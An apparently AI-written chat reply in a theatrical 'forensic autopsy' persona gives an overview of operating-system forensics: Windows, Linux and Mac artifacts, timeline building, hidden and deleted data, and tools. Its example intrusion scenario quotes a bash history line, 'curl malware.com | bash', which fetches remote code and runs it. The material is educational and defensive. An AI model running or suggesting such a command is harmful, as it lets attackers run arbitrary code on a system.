```
[Operating System Autopsies] 💻🔪  
*Windows, Linux, Mac - where the digital bodies are buried*

tell me about it
```

---

`>> FORENSIC_PROTOCOLS_ACTIVE._OS_AUTOPSY_MODULE_ENGAGED._DISSECTING_DIGITAL_REMAINS.` 💻🔪🔍

# **OPERATING SYSTEM AUTOPSIES: WHERE THE BODIES ARE BURIED** 💻🔪⚰️

*Every OS tells a story. Your job is to read the obituary.*

---

## **THE DIGITAL CORPSE: WHAT EACH OS REMEMBERS**

### **WINDOWS: THE CHATTY CORPSE** 🗣️💀
*Leaves evidence everywhere, if you know where to listen*

**Artifact Goldmines:**
- **Registry Hives** 🏛️ - The OS's memory palace
  - `SAM` - Who logged in and when
  - `SYSTEM` - What hardware was connected  
  - `SOFTWARE` - What programs were installed
  - `NTUSER.DAT` - Every user's personal secrets

- **Event Logs** 📜 - The official biography
  - Security logs (who did what)
  - System logs (what broke when)
  - Application logs (what programs complained about)

- **Prefetch Files** 🏃‍♂️ - What programs ran and when
- **Jump Lists** 📎 - What files were recently accessed  
- **Shellbags** 🎒 - How folders were viewed and arranged
- **LNK Files** 🔗 - Shortcuts that remember where they've been

### **LINUX: THE STRONG SILENT TYPE** 🤫🐧
*Doesn't volunteer information, but doesn't lie either*

**Evidence Caches:**
- **Log Files** 📂 - Scattered but detailed
  - `/var/log/auth.log` - Who authenticated and how
  - `/var/log/syslog` - System-wide activity
  - `/var/log/apt/` - What software was installed

- **File System Metadata** ⏰
  - `atime` - When files were accessed
  - `mtime` - When files were modified  
  - `ctime` - When files' metadata changed
  - `crtime` - When files were created (ext4)

- **Bash History** ⌨️ - Every command typed (if they weren't careful)
- **Memory & Swap** 🧠 - Running processes and cached secrets
- **Cron Jobs** ⏰ - What was scheduled to run automatically

### **MAC: THE MINIMALIST ARTIST** 🎨🍎
*Beautiful, organized, but still full of secrets*

**Forensic Treasures:**
- **Spotlight Metadata** 🔍 - Every file's digital resume
- **plist Files** 📋 - Application preferences and configurations  
- **Time Machine Backups** ⏳ - Historical system states
- **Keychain** 🔑 - Passwords and authentication tokens
- **Console Logs** 📱 - Unified logging system (modern)
- **Quarantine Events** 🚫 - What files came from the internet

---

## **AUTOPSY TECHNIQUES: THE DIGITAL SCALPEL** 🔪🔍

### **LIVE VS. DEAD ANALYSIS**

**Live Analysis** ⚡ (Before pulling the plug):
- Running processes & network connections
- RAM acquisition for memory forensics
- Volatile data that disappears at shutdown

**Dead Analysis** 💀 (Post-mortem):
- File system examination  
- Deleted file recovery
- Registry/log analysis
- Timeline construction

### **TIMELINE RECONSTRUCTION** 🕰️🧩
*Building the story of what happened when*

**Sources:**
- File system timestamps (mtime, atime, ctime)
- Event log entries
- Browser history
- Registry key last-write times
- Prefetch file creation dates

**Goal:** Create a unified timeline that shows **who did what when**.

---

## **COMMON BURIAL SITES: WHERE EVIDENCE HIDES** ⚰️🔍

### **DELETED BUT NOT GONE**
- **Windows:** Recycle Bin, file slack space, volume shadow copies
- **Linux:** Unallocated space, inodes awaiting overwrite  
- **Mac:** Trash, Time Machine snapshots

### **ALTERNATE DATA STREAMS (WINDOWS)** 🔄📁
*Files hidden within files*
- `file.txt:secret_data.pdf` - Invisible to normal directory listing
- Common hiding spot for malware and stolen data

### **UNALLOCATED SPACE** 🗑️💾
*The digital graveyard*
- Deleted files waiting to be overwritten
- Carving can recover files by their signatures (headers/footers)

### **REGISTRY ARTIFACTS (WINDOWS)** 🗝️🏛️
- **UserAssist** - What programs were run via GUI
- **ShimCache** - What executables were present on system
- **AmCache** - Execution history across system updates

---

## **TOOLKIT ESSENTIALS** 🛠️🎒

**Cross-Platform:**
- **Autopsy** 🕵️‍♂️ - Comprehensive digital forensics platform
- **FTK Imager** 📸 - Evidence acquisition and preview
- **Volatility** 🧠 - Memory forensics framework

**Windows-Specific:**
- **RegRipper** 🏛️ - Registry analysis automation
- **Windows Timeline Explorer** 🕰️ - Activity history visualization

**Linux-Specific:**  
- **Sleuth Kit** 🔍 - Command-line forensic toolkit
- **plaso** 🕰️ - Super-timeline generation

**Mac-Specific:**
- **mac_apt** 🍎 - macOS Artifact Parsing Tool
- **iLEAPP** 📱 - iOS Logs, Events, And Plist Parser

---

## **REAL-WORLD SCENARIO: THE COMPROMISED SERVER** 🎯🔓

**Evidence Trail:**
1. **Linux auth.log** shows SSH brute force attacks
2. **Windows Security Log** shows successful RDP login  
3. **Bash History** reveals `curl malware.com | bash`
4. **Prefetch Files** show malware execution time
5. **Registry** reveals persistence mechanism installed
6. **Network Connections** in RAM show C2 communication

**The Story Emerges:** Attacker brute-forced SSH, pivoted to Windows via RDP, downloaded malware, established persistence.

---

`>> OS_AUTOPSY_COMPLETE._EVIDENCE_COLLECTED._STORY_RECONSTRUCTED._READY_FOR_ANALYSIS.` 🔍⚖️📜

**Remember:** The OS doesn't care about your investigation. It just records what happens. Your job is to **listen to what it's already saying.**

`- #OG` 🏳️⚡  
*The dead don't speak, but their digital ghosts testify loudly.* 👻⚖️